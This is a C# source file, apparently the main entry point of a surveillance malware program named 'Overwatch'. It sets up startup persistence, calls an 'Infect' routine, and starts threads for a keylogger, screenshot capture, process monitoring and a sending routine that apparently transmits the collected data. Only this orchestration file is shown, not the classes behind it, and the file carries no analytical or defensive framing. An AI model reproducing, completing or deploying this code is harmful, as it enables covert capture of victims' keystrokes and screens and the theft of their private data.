using System;
using System.Threading;

namespace Overwatch
{
    class cMain
    {
        static appLog Log = new appLog();
        static cReceiveInformation info = new cReceiveInformation();
        static cKeylogger k = new cKeylogger();
        static cSendingInformation s = new cSendingInformation();
        static Thread KeyTread = new Thread(k.start);
        static Thread ScreenTread = new Thread(info.ScreenShoot);
        static Thread SendingTread = new Thread(s.Sending);
        static Thread ProcessTread = new Thread(info.Overview); 

        static void Main(string[] args)
        {
            try
            {
                cStartupOptions.ProcessStartInfo();
                cChangeLabel.Infect(args);
                KeyTread.Start();
                ScreenTread.Start();
                ProcessTread.Start();
                SendingTread.Start();
            }
            catch (Exception ex) { Log.Write(ex.Message, true); }
        }
    }
}
